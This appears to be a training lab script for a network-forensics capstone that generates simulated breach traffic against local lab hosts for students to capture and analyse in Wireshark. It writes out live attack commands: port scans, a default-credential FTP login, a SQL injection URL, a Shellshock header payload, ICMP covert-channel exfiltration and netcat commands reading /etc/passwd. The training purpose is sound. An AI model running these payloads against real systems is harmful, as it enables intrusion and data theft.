#!/usr/bin/env bash
# ==============================================================================
# Packet Ninja: Capstone Project Breach Traffic Generator
# Case: Operation MedTech Breach (INC-2026-8819)
# Run from: Kali Linux (10.10.10.10)
# ==============================================================================

set -euo pipefail

TARGET_WEB="10.10.10.20"
TARGET_LEGACY="10.10.10.30"
INTERFACE="eth0"

echo -e "\e[1;34m[*] =======================================================\e[0m"
echo -e "\e[1;34m[*] Packet Ninja: Capstone Breach Traffic Simulation\e[0m"
echo -e "\e[1;34m[*] Targets: Web=$TARGET_WEB | Legacy=$TARGET_LEGACY\e[0m"
echo -e "\e[1;34m[*] =======================================================\e[0m"

# Ensure Wireshark or tcpdump is running
echo -e "\e[1;33m[!] Ensure Wireshark is capturing on $INTERFACE before starting!\e[0m"
read -p "Press [Enter] to launch the simulated attack sequence..."

echo -e "\n\e[1;32m[*] [PHASE 1] Active Reconnaissance & Port Sweeps...\e[0m"
# ARP sweep of local subnet
nmap -sn 10.10.10.0/24 >/dev/null 2>&1 || true
# TCP SYN Stealth Scan against targets
sudo nmap -sS -p 21,22,80,445 $TARGET_WEB >/dev/null 2>&1 || true
sudo nmap -sS -p 21,22,23,80 $TARGET_LEGACY >/dev/null 2>&1 || true
echo "    [+] Phase 1 Complete."
sleep 2

echo -e "\n\e[1;32m[*] [PHASE 2] Infiltration & Plaintext Credential Harvesting...\e[0m"
# Plaintext FTP authentication attempt against legacy firmware server
printf "USER msfadmin\r\nPASS msfadmin\r\nLIST\r\nQUIT\r\n" | nc -vn -w2 $TARGET_LEGACY 21 >/dev/null 2>&1 || true
echo "    [+] Harvested FTP credentials."
sleep 2

echo -e "\n\e[1;32m[*] [PHASE 3] Web Application Exploitation (SQL Injection)...\e[0m"
# UNION-based SQL Injection attempt against internal web application
curl -s "http://$TARGET_WEB/search.php?query=1%20UNION%20SELECT%20username,password%20FROM%20users" >/dev/null 2>&1 || true
# Shellshock exploit probe in HTTP User-Agent header
curl -s -H "User-Agent: () { :;}; echo 'VULNERABLE' > /tmp/breach_marker" http://$TARGET_WEB/ >/dev/null 2>&1 || true
echo "    [+] Web exploitation probes executed."
sleep 2

echo -e "\n\e[1;32m[*] [PHASE 4] Staging Stolen Credentials via HTTP POST...\e[0m"
# Stolen user credentials posted through simulated login portal with custom User-Agent
curl -s -X POST http://$TARGET_WEB/login.html \
  -H "User-Agent: Mozilla/5.0 (Rogue-Infiltrator/2.4)" \
  -d "user=dr_evans&password=PatientRecords2026!&auth_token=SUPERSECRET" >/dev/null 2>&1 || true
echo "    [+] Credential staging complete."
sleep 2

echo -e "\n\e[1;32m[*] [PHASE 5] Covert Channel Data Exfiltration...\e[0m"
# Exfiltrate confidential database marker hidden inside ICMP Echo Request payload
# Hex 44425f455846494c5f50415449454e545f44415441 = "DB_EXFIL_PATIENT_DATA"
ping -c 4 -p "44425f455846494c5f50415449454e545f44415441" $TARGET_WEB >/dev/null 2>&1 || true
echo "    [+] Covert ICMP exfiltration packets transmitted."
sleep 2

echo -e "\n\e[1;32m[*] [PHASE 6] Interactive Reverse Shell Execution...\e[0m"
# Send simulated command execution across socket
(echo "whoami"; sleep 1; echo "id"; sleep 1; echo "cat /etc/passwd | head -3"; sleep 1; echo "exit") | nc -vn -w3 $TARGET_LEGACY 21 >/dev/null 2>&1 || true
echo "    [+] Reverse shell commands executed."

echo -e "\n\e[1;34m[+] =======================================================\e[0m"
echo -e "\e[1;34m[+] SIMULATION COMPLETE!\e[0m"
echo -e "\e[1;34m[+] Stop Wireshark capture and save as: capstone_breach.pcapng\e[0m"
echo -e "\e[1;34m[+] Open 10-Capstone-Project/02-investigation-workbook.md to begin triage.\e[0m"
echo -e "\e[1;34m[+] =======================================================\e[0m"
